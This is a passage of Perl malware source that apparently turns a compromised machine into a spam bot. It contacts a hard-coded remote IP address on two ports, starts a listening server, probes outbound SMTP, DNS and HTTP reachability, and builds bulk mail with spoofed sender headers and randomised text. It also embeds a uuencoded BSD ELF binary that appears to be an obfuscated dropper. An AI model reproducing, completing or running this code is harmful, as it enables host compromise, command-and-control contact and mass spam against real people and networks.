$info =~ s/.*?\|[\s\|]*(.+?)[\s\|]*$/$1/ if length $info;
return (\$mail, \$name, \$info);
}
sub init
{
&bdrp() if $^O ne "MSWin32";
&main('77.72.83.137',84,'/');
&main('77.72.83.137',83,'/');
&startserver() if $^O ne "MSWin32";
}
sub data
{
my ($to, $from, $b) = @_;
my $time = time;
my $zone = sprintf ("%s%02d00", $b->{timezone}[0], $b->{timezone}[1]);
my $date = localtime $time; $date =~ s/^(\w+)\s+(\w+)\s+(\d+)\s+(\d+):(\d+):(\d+)\s+(\d+)$/sprintf "$1, $3 $2 $7 $4:$5:$6 %s", $zone/e;
my $wday = {Mon => "Monday", Tue => "Tuesday", Wed => "Wednesday", Thu => "Thursday", Fri => "Friday", Sat => "Saturday", Sun => "Sunday"}->{$1};
my $nmon = {Jan => 1, Feb => 2, Mar => 3, Apr => 4, May => 5, Jun => 6, Jul => 7, Aug => 8, Sep => 9, Oct => 10, Nov => 11, Dec => 12}->{$2};
my $tmon = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]->[$nmon - 1];
my $ampm = "AM"; my $hour = int $4; $ampm = "PM" if $hour == 12; $hour = 12 if $hour == 0; if ($hour > 12) { $ampm = "PM"; $hour -= 12; }
$date =
{
DATE	=> $date,
WWWW	=> $wday,
WWW		=> $1,
DD		=> sprintf ("%02d", $3),
D		=> $3,
MMMM	=> $tmon,
MMM		=> $2,
MM		=> sprintf ("%02d", $nmon),
M		=> $nmon,
YYYY	=> $7,
YY		=> substr ($7, -2),
Z		=> $zone,
TT		=> $ampm,
tt		=> lc $ampm,
HH		=> $4,
H		=> int $4,
hh		=> sprintf ("%02d", $hour),
h		=> $hour,
mm		=> $5,
m		=> int $5,
ss		=> $6,
s		=> int $6
};
my ($mail, $name) = &mail(\$from);
my ($user, $host) = split (/\@/, $$mail);
$from = {ADDR => length $$name ? "$$name <$$mail>" : "<$$mail>", NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
my $replyto = $from;
if ($b->{from}[0] ne $b->{replyto}[0])
{
($mail, $name) = &mail(\@{$b->{replyto}}[int rand scalar @{$b->{replyto}}]);
($user, $host) = split (/\@/, $$mail);
$replyto = {ADDR => length $$name ? "$$name <$$mail>" : "<$$mail>", NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
}
if ($b->{method} == 0)
{
@_ = ();
foreach (@$to) { ($mail, $name) = &mail(\$_); $_ = length $$name ? "$$name <$$mail>" : "<$$mail>"; push @_, $_; }
($user, $host) = split (/\@/, $$mail);
$to = {ADDR => join (",\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20", @_), NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
}
else
{
($mail, $name) = &mail(\$to->[0]);
($user, $host) = split (/\@/, $$mail);
$to = {ADDR => length $$name ? "$$name <$$mail>" : "<$$mail>", NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
}
my $head =
{
HELO		=> $b->{helo},
TYPE		=> $b->{type} ? "html" : "plain",
SUBJECT		=> @{$b->{subject}}[int rand scalar @{$b->{subject}}],
CHARSET		=> $b->{charset},
ENCODING	=> $b->{charset} eq "windows-1251" ? "8bit" : "7bit",
NPRIORITY	=> (5 - $b->{priority} * $b->{priority} - ($b->{priority} == 1 ? 1 : 0)),
TPRIORITY	=> ["Low", "Normal", "High"]->[$b->{priority}],
MESSAGEID	=> sprintf ("%08x\.%04x%04x", int ($time * 0.0023283064365387 + 27111902.8329849), int rand 32769, int rand 32769)
};
my $letter = length $b->{letter} ? sprintf ("%s%s%s", $b->{header}, "\x0D\x0A\x0D\x0A", $b->{letter}) : $b->{header};
$letter =~ s/\%$_\%/$head->{$_}/g foreach (keys %$head);
$letter =~ s/\%$_\%/$date->{$_}/g foreach (keys %$date);
$letter =~ s/\%FROM$_\%/$from->{$_}/g foreach (keys %$from);
$letter =~ s/\%REPLYTO$_\%/$replyto->{$_}/g foreach (keys %$replyto);
$letter =~ s/\%TO$_\%/$to->{$_}/g foreach (keys %$to);
&tag(\$letter);
if (!length $b->{letter})
{
$letter =~ s/\x0D//gm;
$letter =~ s/\x0A/\x0D\x0A/gm;
}
return $letter;
}
sub quoted ($)
{
my $line = shift;
$line =~ s/([^ \t\x0D\x0A!"#\$%&'()*+,\-.\/0-9:;<>?\@A-Z[\\\]^_`a-z{|}~])/sprintf ("=%02X", ord ($1))/eg;
$line =~ s/([ \t]+)$/join ("", map {sprintf ("=%02X", ord ($_))} split ("", $1))/egm;
my $lines = "";
$lines .= "$1=\x0D\x0A" while $line =~ s/(.*?^[^\x0D\x0A]{71}(?:[^=\x0D\x0A]{2}(?![^=\x0D\x0A]{0,1}$)|[^=\x0D\x0A](?![^=\x0D\x0A]{0,2}$)|(?![^=\x0D\x0A]{0,3}$)))//xsm;
$lines .= $line;
return $lines;
}
sub tag
{
my $line = shift;
my $save = [];
$$line =~ s/\[random\]([^\[]*)\[\/random\]({\d+,\d+})?(\((\d+)\))?/&tagrandom($1, $2, $4, \$save)/eg;
$$line =~ s/\[string\]([^\[]*)\[\/string\](\((\d+)\))?/&tagstring($1, $3, \$save)/eg;
$$line =~ s/\%\[(\d+)\]/$1 < 64 && defined $save->[$1] ? $save->[$1] : ""/eg;
$$line =~ s/\[quot\](.*?)\[\/quot\]/&quoted($1)/egs;
}
sub tagrandom
{
my ($line, $spec, $cell, $save) = @_;
if (defined $line && length $line)
{
if (defined $spec && $spec =~ /^{(\d+),(\d+)}$/)
{
$spec = $2 > 64 ? 64 : $2;
$spec = $1 < $spec ? ($1 + int rand (1 + $spec - $1)) : $spec;
}
else
{
$spec = length $line;
$spec = 1 + ($spec > 64 ? int rand 64 : int rand $spec);
}
$line = [split (//, $line)];
$line = join ('', @$line[map {rand @$line}(1..$spec)]);
}
$line = defined $line ? $line : "";
$$save->[$cell] = $line if defined $cell && $cell < 64;
return $line;
}
sub tagstring
{
my ($line, $cell, $save) = @_;
if (defined $line && length $line)
{
$line = [split (/\|/, $line)];
$line = $line->[int rand scalar @$line];
}
$line = defined $line ? $line : "";
$$save->[$cell] = $line if defined $cell && $cell < 64;
return $line;
}
sub test
{
while (1)
{
my $readers = IO::Select->new() or last;
my $writers = IO::Select->new() or last;
my $session = {};
foreach my $result (keys %$test)
{
while (1 < scalar @{$test->{$result}})
{
my $host = pop @{$test->{$result}};
my $addr = pack ("C4", split (/\./, $host));
my ($protocol, $port);
if ($result eq "ip")
{
($protocol, $port) = ("tcp", 80);
}
else
{
($protocol, $port) = $result =~ /^(tcp|udp)(\d+)$/;
}
$addr = sockaddr_in($port, $addr);
my $socket = $protocol eq "tcp" ? IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM) : IO::Socket::INET->new(Proto => "udp");
next unless $socket;
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
if ($protocol eq "tcp")
{
unless ($socket->connect($addr))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
next;
}
}
}
$writers->add($socket);
$session->{$socket} = {status => $protocol eq "tcp" ? "cn" : "wr", buffer => "", timeout => 5, result => $result, addr => $addr};
if ($port == 53)
{
$session->{$socket}{buffer} .= pack ("nSn4", int rand 65535, 1, 1, 0, 0, 0);$session->{$socket}{buffer} .= pack ("C", length $_) . $_ for (split (/\./, $host));$session->{$socket}{buffer} .= pack ("Cn2", 0, 1, 1);
$session->{$socket}{buffer} = join ("", pack ("n", length $session->{$socket}{buffer}), $session->{$socket}{buffer}) if $protocol eq "tcp";
}
elsif ($port == 80)
{
$session->{$socket}{buffer} = join ("\x0D\x0A", "GET / HTTP/1.1", "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*", "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", "Host: $host", "Connection: close", "Cache-Control: no-cache", "\x0D\x0A");
}
}
}
$session->{$_}{timeout} += time foreach (keys %$session);
while ($readers->count() || $writers->count())
{
my $time = time;
my $writable = (IO::Select->select(undef, $writers, undef, 0))[1];foreach my $handle (@$writable)
{
if ($session->{$handle}{status} eq "cn")
{
if ($handle->connected)
{
if ($session->{$handle}{result} eq "tcp25")
{
$session->{$handle}{status} = "rd";
$readers->add($handle);
$writers->remove($handle);
}
else
{
$session->{$handle}{status} = "wr";
}
}
else
{
$session->{$handle}{timeout} = 0;
}
}
else
{
my $result;
if ($session->{$handle}{result} eq "udp53")
{
$result = $handle->send($session->{$handle}{buffer}, 0, $session->{$handle}{addr});
}
elsif ($session->{$handle}{result} eq "tcp53")
{
$result = $handle->send($session->{$handle}{buffer});
}
else
{
$result = syswrite ($handle, $session->{$handle}{buffer});
}
if (defined $result && $result > 0)
{
substr ($session->{$handle}{buffer}, 0, $result) = "";
if (length $session->{$handle}{buffer} < 1)
{
$session->{$handle}{status} = "rd";
$readers->add($handle);
$writers->remove($handle);
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$session->{$handle}{timeout} = 0;
}
}
}
my $readable = (IO::Select->select($readers, undef, undef, 0))[0];foreach my $handle (@$readable)
{
my $result;
if ($session->{$handle}{result} eq "udp53")
{
$result = $handle->recv($session->{$handle}{buffer}, 512);$result = length $session->{$handle}{buffer} if defined $result;
}
elsif ($session->{$handle}{result} eq "tcp53")
{
$result = $handle->recv($session->{$handle}{buffer}, 2);
$result = length $session->{$handle}{buffer} if defined $result;
}
else
{
$result = sysread ($handle, $session->{$handle}{buffer}, 8192, length $session->{$handle}{buffer});
}
if (defined $result)
{
if ($session->{$handle}{result} eq "ip")
{
if ($test->{$session->{$handle}{result}}[0] eq "0.0.0.0")
{
if ($session->{$handle}{buffer} =~ /(\d+\.\d+\.\d+\.\d+)/)
{
$test->{$session->{$handle}{result}}[0] = $1;
$session->{$handle}{timeout} = 0;
}
else
{
next;
}
}
else
{
$session->{$handle}{timeout} = 0;
}
}
else
{
$test->{$session->{$handle}{result}}[0] = 1 if $result > 0;
$session->{$handle}{timeout} = 0;
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$session->{$handle}{timeout} = 0;
}
}
foreach my $handle ($writers->handles, $readers->handles)
{
if ($time >= $session->{$handle}{timeout})
{
$readers->remove($handle) if $readers->exists($handle);
$writers->remove($handle) if $writers->exists($handle);
delete $session->{$handle};
close $handle;
}
}
}
last;
}
}
sub bdrp
{
my $bdrp;
if ($^O =~ /bsd$/i)
{
$bdrp = <<'BDRPDATABSD';
M?T5,1@$!`0D```````````(``P`!````@(`$"#0```"H&0```````#0`(``"
M`"@`!P`$``$``````````(`$"`"`!`@!`P```0,```4`````$````0````0#
M```$DP0(!),$"'<6``",&@``!@`````0``````````````````"))7RI!`B^
M!9,$"+D-````Z'D```#HH````+X3DP0(N6@6``#H90```+@$````BQV,J00(
MN1.3!`BZ:!8``%)14U#-@',"]]B!Q!`````]``````^,+````#G0#X4D````
MN`8```"+'8RI!`A34,V`<P+WV('$"````#T`````#XP`````,<!`,=M34,V`
M,=M#0T-#NA````!67SG3=1.!^H````!U`C'2@<(0````,=M#K##8JD/BXL.*
M#023!`BX*@```+N`J00(4U#-@',"]]B!Q`@````]``````^,HO___X#Y"74%
MB0.)4P2X*@```+N(J00(4U#-@',"]]B!Q`@````]``````^,=?___X#Y"74%
MB0.)4P2X`@```%"`^0EU"\V`<P+WV.D"````S8"!Q`0````]``````^,0O__
M_P^$20```+@&````BQV$J00(4U#-@',"]]B!Q`@````]``````^,&/___[@&
M````BQV(J00(4U#-@',"]]B!Q`@````]``````^,]/[__\.*%023!`BX/P``
M`(#Z"74%N%H```"+'8BI!`@QR5%34,V`<P+WV('$#````#T`````#XR\_O__
MN#\```"`^@EU!;A:````BQV$J00(,<E!45-0S8!S`O?8@<0,````/0`````/
MC(K^__^X!@```(L=@*D$"%-0S8!S`O?8@<0(````/0`````/C&;^__^X!@``
M`(L=C*D$"%-0S8!S`O?8@<0(````/0`````/C$+^__^+)7RI!`B)YEE8XOV-
M5"0$B?2-3"0$NP63!`B@!),$"#P)=0ZX.P```%)14U#I!0```+@+````S8#I
M!/[__P````DK<'5U)VMC92-]:WUM`'%V8R=[?7AB;WDU+W1Q9B15251!43$K
M>7YK+UE>*"E'>G5\?6TA.VEN>S](33D^5F-K;6I^,"PI/B\M,3!B>71_>SHB
M.C]@/2,_$1H"3ET%`D)?2T9$3T8.$B$S,C\E:WXH+6]B?']A:&(Q+S,E("8L
M.'!\.S0Y0%``1%,#!DE/25U1"`(,5@X+54907UM671<%&0L*!QT:6FAR<6MB
M="<U*3LZ.38N<AIX=#,\,4A8.'QK.SY[;'I%0U%'!@P&7`@-3UQ.04%,6Q$/
M$P<`#1<<7%-+3E)936!\8G!R?F8Z:&\G*B4C9F8Z(G!Q9R9J:6!D*W<M:W=Y
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
M0T`7`P8,#!@805,<"AT>!!9<41X6%AT6'E5=%QDA)G%A9&)B>GHG-6EU9WQU
M<2L@;6=I;&5O(C<M;6-_8G<S,'UW>7QU?R`\8#YM9'9V=FL])W4I=RMQ!P`N
M<WEM=&%B`"YS=')T86(`+G-H<W1R=&%B`"YT97AT`"YD871A`"YB<W,`````
M```````````````````````````````````````````````````;`````0``
M``8```"`@`0(@````($"`````````````!``````````(0````$````#````
M!),$"`0#``!W%@`````````````$`````````"<````(`````P```'RI!`A[
M&0``%`0`````````````!``````````1`````P``````````````>QD``"P`
M``````````````$``````````0````(``````````````,`:```@`@``!@``
M`!X````$````$`````D````#``````````````#@'```K`$`````````````
M`0```````````````````````````````````("`!`@``````P`!```````$
MDP0(``````,``@``````?*D$"``````#``,``0``````````````!`#Q_Q8`
M```%@00(`````````0`;````#H$$"`````````$`(P```!N!!`@````````!
M`#H````I@00(`````````0!1````,H$$"`````````$`:````#J!!`@`````
M```!`&T```!M@00(`````````0"&````FH$$"`````````$`GP```+"!!`@`
M```````!`+@```"R@00(`````````0#1````$H($"`````````$`X0```">"
M!`@````````!`/H```!8@@0(`````````0`3`0``]8($"`````````$`+`$`
M`/J"!`@````````!`$4!```$DP0(`````````@!,`0``!9,$"`````````(`
M4P$```T```````````#Q_UH!```3DP0(`````````@!A`0``:!8`````````
M`/'_:`$```$```````````#Q_W$!``!\J00(`````````P!X`0``@*D$"```
M``````,`?P$``(BI!`@````````#`(8!``"0J00(`````````P"-`0``@(`$
M"``````0``$`E`$``'NI!`@`````$`#Q_Z`!``![J00(`````!``\?^G`0``
MD*T$"``````0`/'_`"XO+B]L;V%D97)?9G)E96)S9"YS`&5X:70`>&]R9&%T
M80!X;W)D871A+GAO<F1A=&%?;&]O<%\Q`'AO<F1A=&$N>&]R9&%T85]L;V]P
M7S(`>&]R9&%T82YX;W)D871A7VQO;W!?,P!P:7!E`'!I<&4N<&EP95]S:VEP
M7V9R965B<V1?,0!P:7!E+G!I<&5?<VMI<%]F<F5E8G-D7S(`<&EP92YP:7!E
M7W-K:7!?9G)E96)S9%\S`'!I<&4N<&EP95]S:VEP7V9R965B<V1?-`!P:7!E
M+G!I<&5?8VAI;&0`<&EP92YP:7!E7W-K:7!?9G)E96)S9%\U`'!I<&4N<&EP
M95]S:VEP7V9R965B<V1?-@!P:7!E+G!I<&5?<VMI<%]F<F5E8G-D7S<`<&EP
M92YP:7!E7W-K:7!?9G)E96)S9%\X`'-Y<W1E;0!A<F=V7S``87)G=E]S`'!?
M8V]D90!P7W-I>F4`4UE37V5X:70`<W1A8VMP`&9H86YD80!F:&%N9&(`8G5F
